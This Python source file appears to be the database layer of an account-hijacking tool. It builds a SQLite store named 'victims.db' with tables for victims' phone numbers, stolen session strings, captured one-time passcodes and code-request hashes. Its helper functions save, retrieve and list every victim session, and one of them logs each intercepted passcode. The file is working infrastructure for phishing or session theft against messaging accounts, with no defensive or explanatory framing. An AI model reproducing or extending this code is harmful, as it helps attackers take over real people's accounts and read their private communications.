import sqlite3
import logging
import time

logger = logging.getLogger(__name__)

def get_db_connection():
    """Get database connection with timeout and error handling"""
    max_retries = 3
    for attempt in range(max_retries):
        try:
            conn = sqlite3.connect('victims.db', check_same_thread=False, timeout=30.0)
            conn.execute("PRAGMA busy_timeout = 5000")  # 5 second timeout
            conn.execute("PRAGMA journal_mode = WAL")  # Better concurrency
            return conn
        except sqlite3.OperationalError as e:
            if "database is locked" in str(e) and attempt < max_retries - 1:
                logger.warning(f"⚠️ Database locked, retrying... ({attempt + 1}/{max_retries})")
                time.sleep(1)
            else:
                logger.error(f"❌ Database connection failed: {e}")
                raise e
    return None

def init_db():
    """Initialize database"""
    try:
        conn = get_db_connection()
        if conn is None:
            logger.error("❌ Failed to connect to database after retries")
            return
            
        c = conn.cursor()
        c.execute('''CREATE TABLE IF NOT EXISTS victims
                    (phone TEXT PRIMARY KEY, 
                     session_string TEXT, 
                     created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                     last_otp TEXT,
                     last_otp_time TIMESTAMP)''')
        c.execute('''CREATE TABLE IF NOT EXISTS otp_requests
                    (id INTEGER PRIMARY KEY AUTOINCREMENT,
                     phone TEXT,
                     hash TEXT,
                     created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP)''')
        conn.commit()
        conn.close()
        logger.info("✅ Database initialized")
    except Exception as e:
        logger.error(f"❌ Database init error: {e}")

def save_victim_session(phone, session_string):
    """Save victim session"""
    try:
        conn = get_db_connection()
        if conn is None:
            return False
            
        c = conn.cursor()
        c.execute("INSERT OR REPLACE INTO victims (phone, session_string) VALUES (?, ?)", 
                 (phone, session_string))
        conn.commit()
        conn.close()
        logger.info(f"✅ Session saved for {phone}")
        return True
    except Exception as e:
        logger.error(f"❌ Save session error for {phone}: {e}")
        return False

def get_victim_session(phone):
    """Get victim session"""
    try:
        conn = get_db_connection()
        if conn is None:
            return None
            
        c = conn.cursor()
        c.execute("SELECT session_string FROM victims WHERE phone = ?", (phone,))
        result = c.fetchone()
        conn.close()
        return result[0] if result else None
    except Exception as e:
        logger.error(f"❌ Get session error for {phone}: {e}")
        return None

def get_all_victim_sessions():
    """Get all victim sessions"""
    try:
        conn = get_db_connection()
        if conn is None:
            return []
            
        c = conn.cursor()
        c.execute("SELECT phone, session_string FROM victims")
        sessions = c.fetchall()
        conn.close()
        return sessions
    except Exception as e:
        logger.error(f"❌ Get all sessions error: {e}")
        return []

def save_otp_request(phone, hash_value):
    """Save OTP request"""
    try:
        conn = get_db_connection()
        if conn is None:
            return False
            
        c = conn.cursor()
        c.execute("INSERT INTO otp_requests (phone, hash) VALUES (?, ?)", 
                 (phone, hash_value))
        conn.commit()
        conn.close()
        return True
    except Exception as e:
        logger.error(f"❌ Save OTP request error: {e}")
        return False

def update_victim_otp(phone, otp_code):
    """Update victim's last OTP"""
    try:
        conn = get_db_connection()
        if conn is None:
            return False
            
        c = conn.cursor()
        c.execute("UPDATE victims SET last_otp = ?, last_otp_time = CURRENT_TIMESTAMP WHERE phone = ?", 
                 (otp_code, phone))
        conn.commit()
        conn.close()
        logger.info(f"✅ OTP updated for {phone}: {otp_code}")
        return True
    except Exception as e:
        logger.error(f"❌ Update OTP error for {phone}: {e}")
        return False

def get_victim_otp(phone):
    """Get victim's last OTP"""
    try:
        conn = get_db_connection()
        if conn is None:
            return (None, None)
            
        c = conn.cursor()
        c.execute("SELECT last_otp, last_otp_time FROM victims WHERE phone = ?", (phone,))
        result = c.fetchone()
        conn.close()
        return result if result else (None, None)
    except Exception as e:
        logger.error(f"❌ Get OTP error for {phone}: {e}")
        return (None, None)
